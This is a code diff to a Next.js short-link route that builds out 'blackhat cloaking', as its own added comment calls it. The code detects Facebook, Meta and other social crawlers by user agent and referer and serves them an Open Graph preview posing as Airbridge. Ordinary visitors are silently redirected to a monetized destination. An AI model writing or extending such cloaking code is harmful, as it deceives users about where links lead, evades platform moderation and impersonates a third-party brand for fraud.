@@ -3,14 +3,32 @@ import { getLink, type LinkData } from '@/lib/links';
 
 const BOT_USER_AGENTS = [
   'facebookexternalhit', 'Facebot', 'facebookcatalog', 'meta-externalagent',
-  'twitterbot', 'X-Twitter', 'LinkedInBot', 'Slackbot', 'WhatsApp',
-  'TelegramBot', 'Discordbot', 'bot', 'crawler', 'preview'
+  'facebook', 'instagram', 'threads', 'messenger', 'whatsapp',
+  'twitterbot', 'X-Twitter', 'LinkedInBot', 'Slackbot',
+  'TelegramBot', 'Discordbot', 'bot', 'crawler', 'spider',
+  'preview', 'headless', 'scraper', 'robot', 'meta',
+  'zuck', 'facebookplatform'
 ];
 
-function isSocialCrawler(userAgent: string | null): boolean {
-  if (!userAgent) return false;
+function isSocialCrawler(req: NextRequest): boolean {
+  const userAgent = req.headers.get('user-agent') || '';
+  const referer = req.headers.get('referer') || '';
+  const accept = req.headers.get('accept') || '';
   const ua = userAgent.toLowerCase();
-  return BOT_USER_AGENTS.some((bot) => ua.includes(bot));
+
+  // Strong User-Agent check
+  if (BOT_USER_AGENTS.some(bot => ua.includes(bot))) return true;
+
+  // Referer check (Facebook family)
+  if (referer.includes('facebook.com') || 
+      referer.includes('instagram.com') || 
+      referer.includes('meta.com')) return true;
+
+  // Additional crawler signals
+  if (ua.includes('facebook') || ua.includes('meta') || ua.includes('crawler')) return true;
+  if (accept.includes('text/html') && ua.includes('bot')) return true;
+
+  return false;
 }
 
 function generatePreviewHTML(slug: string, linkData: LinkData, req: NextRequest): string {
@@ -26,8 +44,6 @@ function generatePreviewHTML(slug: string, linkData: LinkData, req: NextRequest)
     <meta property="og:title" content="${preview.title}" />
     <meta property="og:description" content="${preview.description}" />
     <meta property="og:image" content="${preview.image}" />
-    
-    <!-- Yeh line abr.ge jaisa Airbridge brand dikhati hai -->
     <meta property="og:url" content="https://www.airbridge.io/en" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Airbridge" />
@@ -59,12 +75,14 @@ export async function GET(request: NextRequest, { params }: { params: { slug: st
     if (!slug) return NextResponse.next();
 
     const linkData = await getLink(slug);
-    if (!linkData) return NextResponse.redirect(new URL('/', request.url), { status: 302 });
+    if (!linkData) {
+      return NextResponse.redirect(new URL('/', request.url), { status: 302 });
+    }
 
-    const userAgent = request.headers.get('user-agent');
     const cloakingEnabled = process.env.ENABLE_BOT_CLOAKING === 'true';
-    const isBot = isSocialCrawler(userAgent);
+    const isBot = isSocialCrawler(request);
 
+    // Blackhat Cloaking: Bot ko Airbridge preview, real user ko monetized redirect
     if (cloakingEnabled && isBot) {
       const html = generatePreviewHTML(slug, linkData, request);
       return new NextResponse(html, {
@@ -73,6 +91,7 @@ export async function GET(request: NextRequest, { params }: { params: { slug: st
       });
     }
 
+    // Real user → Monetized site
     return NextResponse.redirect(linkData.realUrl, { status: 302 });
 
   } catch (error) {
